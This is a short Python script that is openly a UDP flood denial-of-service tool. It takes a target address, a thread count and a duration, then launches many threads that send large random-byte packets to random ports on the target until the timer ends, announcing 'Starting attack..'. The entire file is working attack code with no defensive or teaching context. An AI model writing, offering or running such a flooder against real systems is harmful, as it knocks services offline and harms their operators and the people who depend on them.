#!/usr/bin/python
import socket, random, threading, sys, time

try:
	target = str(sys.argv[1])
	threads =  int(sys.argv[2])
	timer = float(sys.argv[3])
except IndexError:
	print("\n[-] Command usage: python " + sys.argv[0] + " <target> <threads> <time> !")
	sys.exit() 

timeout = time.time() + 1 * timer

def hit():
	try:
		bytes = random._urandom(1024)
		sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
		while time.time() < timeout:
			dport = random.randint(20,65500)
			sock.sendto(bytes*random.randint(5,15),(target, dport))
		return
		sys.exit()
	except:
		pass

print("\n[+] Starting attack..")

for x in range(0, threads):
	threading.Thread(target=hit).start()